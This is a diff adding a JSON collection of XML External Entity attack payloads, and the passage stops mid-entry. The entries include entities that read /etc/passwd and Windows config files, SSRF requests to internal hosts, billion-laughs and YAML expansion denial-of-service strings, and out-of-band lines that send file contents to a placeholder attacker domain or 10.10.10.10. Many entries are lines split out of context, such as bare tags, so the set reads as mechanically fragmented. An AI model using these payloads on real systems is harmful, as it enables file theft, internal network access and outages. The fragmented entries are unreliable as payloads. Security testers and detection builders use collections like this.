@@ -1,0 +1,1757 @@
+[
+  {
+    "id": "xxe-1",
+    "title": "Detect The Vulnerability",
+    "payload": "<!DOCTYPE replace [<!ENTITY example \"Doe\"> ]>",
+    "context": "Detect The Vulnerability",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-2",
+    "title": "Detect The Vulnerability",
+    "payload": "<userInfo>",
+    "context": "Detect The Vulnerability",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-3",
+    "title": "Detect The Vulnerability",
+    "payload": "<firstName>John</firstName>",
+    "context": "Detect The Vulnerability",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-4",
+    "title": "Detect The Vulnerability",
+    "payload": "<lastName>&example;</lastName>",
+    "context": "Detect The Vulnerability",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-5",
+    "title": "Detect The Vulnerability",
+    "payload": "</userInfo>",
+    "context": "Detect The Vulnerability",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-6",
+    "title": "Detect The Vulnerability",
+    "payload": "&name;",
+    "context": "Detect The Vulnerability",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-7",
+    "title": "Detect The Vulnerability",
+    "payload": "%name;",
+    "context": "Detect The Vulnerability",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-8",
+    "title": "Classic XXE",
+    "payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
+    "context": "Classic XXE",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-9",
+    "title": "Classic XXE",
+    "payload": "<?xml version=\"1.0\"?>",
+    "context": "Classic XXE",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-10",
+    "title": "Classic XXE",
+    "payload": "<!DOCTYPE data [",
+    "context": "Classic XXE",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-11",
+    "title": "Classic XXE",
+    "payload": "<!ELEMENT data (#ANY)>",
+    "context": "Classic XXE",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-12",
+    "title": "Classic XXE",
+    "payload": "<!ENTITY file SYSTEM \"file:///etc/passwd\">",
+    "context": "Classic XXE",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-13",
+    "title": "Classic XXE",
+    "payload": "]>",
+    "context": "Classic XXE",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-14",
+    "title": "Classic XXE",
+    "payload": "<data>&file;</data>",
+    "context": "Classic XXE",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-15",
+    "title": "Classic XXE",
+    "payload": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>",
+    "context": "Classic XXE",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-16",
+    "title": "Classic XXE",
+    "payload": "<!DOCTYPE foo [",
+    "context": "Classic XXE",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-17",
+    "title": "Classic XXE",
+    "payload": "<!ELEMENT foo ANY >",
+    "context": "Classic XXE",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-18",
+    "title": "Classic XXE",
+    "payload": "<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
+    "context": "Classic XXE",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-19",
+    "title": "Classic XXE",
+    "payload": "<!ENTITY xxe SYSTEM \"file:///c:/boot.ini\" >]><foo>&xxe;</foo>",
+    "context": "Classic XXE",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-20",
+    "title": "Classic XXE",
+    "payload": "<!ENTITY % xxe PUBLIC \"Random Text\" \"URL\">",
+    "context": "Classic XXE",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-21",
+    "title": "Classic XXE",
+    "payload": "<!ENTITY xxe PUBLIC \"Any TEXT\" \"URL\">",
+    "context": "Classic XXE",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-22",
+    "title": "Classic XXE Base64 Encoded",
+    "payload": "<!DOCTYPE test [ <!ENTITY % init SYSTEM \"data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk\"> %init; ]><foo/>",
+    "context": "Classic XXE Base64 Encoded",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-23",
+    "title": "PHP Wrapper Inside XXE",
+    "payload": "<!DOCTYPE replace [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\"> ]>",
+    "context": "PHP Wrapper Inside XXE",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-24",
+    "title": "PHP Wrapper Inside XXE",
+    "payload": "<contacts>",
+    "context": "PHP Wrapper Inside XXE",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-25",
+    "title": "PHP Wrapper Inside XXE",
+    "payload": "<contact>",
+    "context": "PHP Wrapper Inside XXE",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-26",
+    "title": "PHP Wrapper Inside XXE",
+    "payload": "<name>Jean &xxe; Dupont</name>",
+    "context": "PHP Wrapper Inside XXE",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-27",
+    "title": "PHP Wrapper Inside XXE",
+    "payload": "<phone>00 11 22 33 44</phone>",
+    "context": "PHP Wrapper Inside XXE",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-28",
+    "title": "PHP Wrapper Inside XXE",
+    "payload": "<address>42 rue du CTF</address>",
+    "context": "PHP Wrapper Inside XXE",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-29",
+    "title": "PHP Wrapper Inside XXE",
+    "payload": "<zipcode>75000</zipcode>",
+    "context": "PHP Wrapper Inside XXE",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-30",
+    "title": "PHP Wrapper Inside XXE",
+    "payload": "<city>Paris</city>",
+    "context": "PHP Wrapper Inside XXE",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-31",
+    "title": "PHP Wrapper Inside XXE",
+    "payload": "</contact>",
+    "context": "PHP Wrapper Inside XXE",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-32",
+    "title": "PHP Wrapper Inside XXE",
+    "payload": "</contacts>",
+    "context": "PHP Wrapper Inside XXE",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-33",
+    "title": "PHP Wrapper Inside XXE",
+    "payload": "<!ENTITY % xxe SYSTEM \"php://filter/convert.base64-encode/resource=http://10.0.0.3\" >",
+    "context": "PHP Wrapper Inside XXE",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-34",
+    "title": "PHP Wrapper Inside XXE",
+    "payload": "<foo>&xxe;</foo>",
+    "context": "PHP Wrapper Inside XXE",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-35",
+    "title": "XInclude Attacks",
+    "payload": "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\">",
+    "context": "XInclude Attacks",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-36",
+    "title": "XInclude Attacks",
+    "payload": "<xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>",
+    "context": "XInclude Attacks",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-37",
+    "title": "Exploiting XXE to Perform SSRF Attacks",
+    "payload": "<!ENTITY xxe SYSTEM \"http://internal.service/secret_pass.txt\" >",
+    "context": "Exploiting XXE to Perform SSRF Attacks",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-38",
+    "title": "Billion Laugh Attack",
+    "payload": "<!ENTITY a0 \"dos\" >",
+    "context": "Billion Laugh Attack",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-39",
+    "title": "Billion Laugh Attack",
+    "payload": "<!ENTITY a1 \"&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;\">",
+    "context": "Billion Laugh Attack",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-40",
+    "title": "Billion Laugh Attack",
+    "payload": "<!ENTITY a2 \"&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;\">",
+    "context": "Billion Laugh Attack",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-41",
+    "title": "Billion Laugh Attack",
+    "payload": "<!ENTITY a3 \"&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;\">",
+    "context": "Billion Laugh Attack",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-42",
+    "title": "Billion Laugh Attack",
+    "payload": "<!ENTITY a4 \"&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;\">",
+    "context": "Billion Laugh Attack",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-43",
+    "title": "Billion Laugh Attack",
+    "payload": "<data>&a4;</data>",
+    "context": "Billion Laugh Attack",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-44",
+    "title": "YAML Attack",
+    "payload": "a: &a [\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\"]",
+    "context": "YAML Attack",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-45",
+    "title": "YAML Attack",
+    "payload": "b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]",
+    "context": "YAML Attack",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-46",
+    "title": "YAML Attack",
+    "payload": "c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]",
+    "context": "YAML Attack",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-47",
+    "title": "YAML Attack",
+    "payload": "d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]",
+    "context": "YAML Attack",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-48",
+    "title": "YAML Attack",
+    "payload": "e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]",
+    "context": "YAML Attack",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-49",
+    "title": "YAML Attack",
+    "payload": "f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]",
+    "context": "YAML Attack",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-50",
+    "title": "YAML Attack",
+    "payload": "g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]",
+    "context": "YAML Attack",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-51",
+    "title": "YAML Attack",
+    "payload": "h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]",
+    "context": "YAML Attack",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-52",
+    "title": "YAML Attack",
+    "payload": "i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]",
+    "context": "YAML Attack",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-53",
+    "title": "Parameters Laugh Attack",
+    "payload": "<!DOCTYPE r [",
+    "context": "Parameters Laugh Attack",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-54",
+    "title": "Parameters Laugh Attack",
+    "payload": "<!ENTITY % pe_1 \"<!---->\">",
+    "context": "Parameters Laugh Attack",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-55",
+    "title": "Parameters Laugh Attack",
+    "payload": "<!ENTITY % pe_2 \"&#37;pe_1;<!---->&#37;pe_1;\">",
+    "context": "Parameters Laugh Attack",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-56",
+    "title": "Parameters Laugh Attack",
+    "payload": "<!ENTITY % pe_3 \"&#37;pe_2;<!---->&#37;pe_2;\">",
+    "context": "Parameters Laugh Attack",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-57",
+    "title": "Parameters Laugh Attack",
+    "payload": "<!ENTITY % pe_4 \"&#37;pe_3;<!---->&#37;pe_3;\">",
+    "context": "Parameters Laugh Attack",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-58",
+    "title": "Parameters Laugh Attack",
+    "payload": "%pe_4;",
+    "context": "Parameters Laugh Attack",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-59",
+    "title": "Parameters Laugh Attack",
+    "payload": "<r/>",
+    "context": "Parameters Laugh Attack",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-60",
+    "title": "Error Based - Using Local DTD File",
+    "payload": "<!DOCTYPE root [",
+    "context": "Error Based - Using Local DTD File",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-61",
+    "title": "Error Based - Using Local DTD File",
+    "payload": "<!ENTITY % local_dtd SYSTEM \"file:///abcxyz/\">",
+    "context": "Error Based - Using Local DTD File",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-62",
+    "title": "Error Based - Using Local DTD File",
+    "payload": "%local_dtd;",
+    "context": "Error Based - Using Local DTD File",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-63",
+    "title": "Error Based - Using Local DTD File",
+    "payload": "<root></root>",
+    "context": "Error Based - Using Local DTD File",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-64",
+    "title": "Linux Local DTD",
+    "payload": "/usr/share/xml/fontconfig/fonts.dtd",
+    "context": "Linux Local DTD",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-65",
+    "title": "Linux Local DTD",
+    "payload": "/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd",
+    "context": "Linux Local DTD",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-66",
+    "title": "Linux Local DTD",
+    "payload": "/usr/share/xml/svg/svg10.dtd",
+    "context": "Linux Local DTD",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-67",
+    "title": "Linux Local DTD",
+    "payload": "/usr/share/xml/svg/svg11.dtd",
+    "context": "Linux Local DTD",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-68",
+    "title": "Linux Local DTD",
+    "payload": "/usr/share/yelp/dtd/docbookx.dtd",
+    "context": "Linux Local DTD",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-69",
+    "title": "Linux Local DTD",
+    "payload": "<!DOCTYPE message [",
+    "context": "Linux Local DTD",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-70",
+    "title": "Linux Local DTD",
+    "payload": "<!ENTITY % local_dtd SYSTEM \"file:///usr/share/xml/fontconfig/fonts.dtd\">",
+    "context": "Linux Local DTD",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-71",
+    "title": "Linux Local DTD",
+    "payload": "<!ENTITY % constant 'aaa)>",
+    "context": "Linux Local DTD",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-72",
+    "title": "Linux Local DTD",
+    "payload": "<!ENTITY &#x25; file SYSTEM \"file:///etc/passwd\">",
+    "context": "Linux Local DTD",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-73",
+    "title": "Linux Local DTD",
+    "payload": "<!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///patt/&#x25;file;&#x27;>\">",
+    "context": "Linux Local DTD",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-74",
+    "title": "Linux Local DTD",
+    "payload": "&#x25;eval;",
+    "context": "Linux Local DTD",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-75",
+    "title": "Linux Local DTD",
+    "payload": "&#x25;error;",
+    "context": "Linux Local DTD",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-76",
+    "title": "Linux Local DTD",
+    "payload": "<!ELEMENT aa (bb'>",
+    "context": "Linux Local DTD",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-77",
+    "title": "Linux Local DTD",
+    "payload": "<message>Text</message>",
+    "context": "Linux Local DTD",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-78",
+    "title": "Windows Local DTD",
+    "payload": "<!DOCTYPE doc [",
+    "context": "Windows Local DTD",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-79",
+    "title": "Windows Local DTD",
+    "payload": "<!ENTITY % local_dtd SYSTEM \"file:///C:\\Windows\\System32\\wbem\\xml\\cim20.dtd\">",
+    "context": "Windows Local DTD",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-80",
+    "title": "Windows Local DTD",
+    "payload": "<!ENTITY % SuperClass '>",
+    "context": "Windows Local DTD",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-81",
+    "title": "Windows Local DTD",
+    "payload": "<!ENTITY &#x25; file SYSTEM \"file://D:\\webserv2\\services\\web.config\">",
+    "context": "Windows Local DTD",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-82",
+    "title": "Windows Local DTD",
+    "payload": "<!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://t/#&#x25;file;&#x27;>\">",
+    "context": "Windows Local DTD",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-83",
+    "title": "Windows Local DTD",
+    "payload": "<!ENTITY test \"test\"'",
+    "context": "Windows Local DTD",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-84",
+    "title": "Windows Local DTD",
+    "payload": "]><xxx>anything</xxx>",
+    "context": "Windows Local DTD",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-85",
+    "title": "Windows Local DTD",
+    "payload": "<!ENTITY &#x25; file SYSTEM \"https://erp.company.com\">",
+    "context": "Windows Local DTD",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-86",
+    "title": "Windows Local DTD",
+    "payload": "<!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://test/#&#x25;file;&#x27;>\">",
+    "context": "Windows Local DTD",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-87",
+    "title": "Error Based - Using Remote DTD",
+    "payload": "<?xml version=\"1.0\" ?>",
+    "context": "Error Based - Using Remote DTD",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-88",
+    "title": "Error Based - Using Remote DTD",
+    "payload": "<!ENTITY % ext SYSTEM \"http://[ATTACKER.DOMAIN.TLD]/ext.dtd\">",
+    "context": "Error Based - Using Remote DTD",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-89",
+    "title": "Error Based - Using Remote DTD",
+    "payload": "%ext;",
+    "context": "Error Based - Using Remote DTD",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-90",
+    "title": "Error Based - Using Remote DTD",
+    "payload": "<message></message>",
+    "context": "Error Based - Using Remote DTD",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-91",
+    "title": "Error Based - Using Remote DTD",
+    "payload": "<!ENTITY % file SYSTEM \"file:///etc/passwd\">",
+    "context": "Error Based - Using Remote DTD",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-92",
+    "title": "Error Based - Using Remote DTD",
+    "payload": "<!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>\">",
+    "context": "Error Based - Using Remote DTD",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-93",
+    "title": "Error Based - Using Remote DTD",
+    "payload": "%eval;",
+    "context": "Error Based - Using Remote DTD",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-94",
+    "title": "Error Based - Using Remote DTD",
+    "payload": "%error;",
+    "context": "Error Based - Using Remote DTD",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-95",
+    "title": "Error Based - Using Remote DTD",
+    "payload": "<!ENTITY % data SYSTEM \"file:///etc/passwd\">",
+    "context": "Error Based - Using Remote DTD",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-96",
+    "title": "Error Based - Using Remote DTD",
+    "payload": "<!ENTITY % eval \"<!ENTITY &#x25; leak SYSTEM '%data;:///'>\">",
+    "context": "Error Based - Using Remote DTD",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-97",
+    "title": "Error Based - Using Remote DTD",
+    "payload": "%leak;",
+    "context": "Error Based - Using Remote DTD",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-98",
+    "title": "Basic Blind XXE",
+    "payload": "<!ENTITY % ext SYSTEM \"http://[ATTACKER.DOMAIN.TLD]/x\"> %ext;",
+    "context": "Basic Blind XXE",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-99",
+    "title": "Basic Blind XXE",
+    "payload": "<r></r>",
+    "context": "Basic Blind XXE",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-100",
+    "title": "Basic Blind XXE",
+    "payload": "<!DOCTYPE root [<!ENTITY test SYSTEM 'http://[ATTACKER.DOMAIN.TLD]'>]>",
+    "context": "Basic Blind XXE",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-101",
+    "title": "Basic Blind XXE",
+    "payload": "<root>&test;</root>",
+    "context": "Basic Blind XXE",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-102",
+    "title": "Basic Blind XXE",
+    "payload": "<!ENTITY % xxe SYSTEM \"file:///etc/passwd\" >",
+    "context": "Basic Blind XXE",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-103",
+    "title": "Basic Blind XXE",
+    "payload": "<!ENTITY callhome SYSTEM \"http://[ATTACKER.DOMAIN.TLD]/?%xxe;\">",
+    "context": "Basic Blind XXE",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-104",
+    "title": "Basic Blind XXE",
+    "payload": "<foo>&callhome;</foo>",
+    "context": "Basic Blind XXE",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-105",
+    "title": "Out of Band XXE",
+    "payload": "<?xml version=\"1.0\" encoding=\"utf-8\"?>",
+    "context": "Out of Band XXE",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-106",
+    "title": "Out of Band XXE",
+    "payload": "<!DOCTYPE data SYSTEM \"http://[ATTACKER.DOMAIN.TLD]/parameterEntity_oob.dtd\">",
+    "context": "Out of Band XXE",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-107",
+    "title": "Out of Band XXE",
+    "payload": "<data>&send;</data>",
+    "context": "Out of Band XXE",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-108",
+    "title": "Out of Band XXE",
+    "payload": "File stored on http://[ATTACKER.DOMAIN.TLD]/parameterEntity_oob.dtd",
+    "context": "Out of Band XXE",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-109",
+    "title": "Out of Band XXE",
+    "payload": "<!ENTITY % file SYSTEM \"file:///sys/power/image_size\">",
+    "context": "Out of Band XXE",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-110",
+    "title": "Out of Band XXE",
+    "payload": "<!ENTITY % all \"<!ENTITY send SYSTEM 'http://[ATTACKER.DOMAIN.TLD]/?%file;'>\">",
+    "context": "Out of Band XXE",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-111",
+    "title": "Out of Band XXE",
+    "payload": "%all;",
+    "context": "Out of Band XXE",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-112",
+    "title": "XXE OOB with DTD and PHP Filter",
+    "payload": "<!ELEMENT r ANY >",
+    "context": "XXE OOB with DTD and PHP Filter",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-113",
+    "title": "XXE OOB with DTD and PHP Filter",
+    "payload": "<!ENTITY % sp SYSTEM \"http://10.10.10.10/dtd.xml\">",
+    "context": "XXE OOB with DTD and PHP Filter",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-114",
+    "title": "XXE OOB with DTD and PHP Filter",
+    "payload": "%sp;",
+    "context": "XXE OOB with DTD and PHP Filter",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-115",
+    "title": "XXE OOB with DTD and PHP Filter",
+    "payload": "%param1;",
+    "context": "XXE OOB with DTD and PHP Filter",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-116",
+    "title": "XXE OOB with DTD and PHP Filter",
+    "payload": "<r>&exfil;</r>",
+    "context": "XXE OOB with DTD and PHP Filter",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-117",
+    "title": "XXE OOB with DTD and PHP Filter",
+    "payload": "File stored on http://10.10.10.10/dtd.xml",
+    "context": "XXE OOB with DTD and PHP Filter",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-118",
+    "title": "XXE OOB with DTD and PHP Filter",
+    "payload": "<!ENTITY % data SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">",
+    "context": "XXE OOB with DTD and PHP Filter",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-119",
+    "title": "XXE OOB with DTD and PHP Filter",
+    "payload": "<!ENTITY % param1 \"<!ENTITY exfil SYSTEM 'http://10.10.10.10/dtd.xml?%data;'>\">",
+    "context": "XXE OOB with DTD and PHP Filter",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-120",
+    "title": "XXE OOB with Apache Karaf",
+    "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>",
+    "context": "XXE OOB with Apache Karaf",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-121",
+    "title": "XXE OOB with Apache Karaf",
+    "payload": "<!DOCTYPE doc [<!ENTITY % dtd SYSTEM \"http://[ATTACKER.DOMAIN.TLD]\"> %dtd;]",
+    "context": "XXE OOB with Apache Karaf",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-122",
+    "title": "XXE OOB with Apache Karaf",
+    "payload": "<features name=\"my-features\" xmlns=\"http://karaf.apache.org/xmlns/features/v1.3.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"",
+    "context": "XXE OOB with Apache Karaf",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-123",
+    "title": "XXE OOB with Apache Karaf",
+    "payload": "xsi:schemaLocation=\"http://karaf.apache.org/xmlns/features/v1.3.0 http://karaf.apache.org/xmlns/features/v1.3.0\">",
+    "context": "XXE OOB with Apache Karaf",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-124",
+    "title": "XXE OOB with Apache Karaf",
+    "payload": "<feature name=\"deployer\" version=\"2.0\" install=\"auto\">",
+    "context": "XXE OOB with Apache Karaf",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-125",
+    "title": "XXE OOB with Apache Karaf",
+    "payload": "</feature>",
+    "context": "XXE OOB with Apache Karaf",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-126",
+    "title": "XXE OOB with Apache Karaf",
+    "payload": "</features>",
+    "context": "XXE OOB with Apache Karaf",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-127",
+    "title": "Bypass via Character Encoding",
+    "payload": "cat utf8exploit.xml | iconv -f UTF-8 -t UTF-16BE > utf16exploit.xml",
+    "context": "Bypass via Character Encoding",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-128",
+    "title": "XXE on JSON Endpoints",
+    "payload": "\"errors\":{",
+    "context": "XXE on JSON Endpoints",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-129",
+    "title": "XXE on JSON Endpoints",
+    "payload": "\"errorMessage\":\"org.xml.sax.SAXParseException: XML document structures must start and end within the same entity.\"",
+    "context": "XXE on JSON Endpoints",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-130",
+    "title": "XXE on JSON Endpoints",
+    "payload": "application/json",
+    "context": "XXE on JSON Endpoints",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-131",
+    "title": "XXE on JSON Endpoints",
+    "payload": "{\"search\":\"name\",\"value\":\"test\"}",
+    "context": "XXE on JSON Endpoints",
+    "tags": [
+      "xxe"
+    ]
+  },
+  {
+    "id": "xxe-132",
+    "title": "XXE on JSON Endpoints",
+    "payload": "application/xml",
